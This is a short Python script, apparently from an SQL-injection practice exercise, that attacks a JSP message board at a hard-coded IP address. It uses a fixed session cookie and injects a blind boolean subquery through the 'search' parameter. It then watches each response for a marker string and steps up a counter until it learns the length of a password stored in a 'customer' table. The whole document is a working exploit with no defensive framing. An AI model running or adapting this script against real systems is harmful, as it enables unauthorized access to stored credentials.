import requests

url = "http://3.36.127.85:8000/SQL3/board.jsp"
cookie = {'JSESSIONID': '5DB16415D7EB29B84BD75497CB9A9473'}

def find_length():
    pwlength = 70

    while True:
        param = {"search": "dd' AND (SELECT LENGTH(password) AS password_length FROM customer WHERE ROWNUM = 1)={} --".format(pwlength)}
        req = requests.get(url, params = param, cookies = cookie)
        if "mas9623" in req.text:
            return pwlength
        else:
            pwlength += 1
            
print("비밀번호의 길이는:", find_length())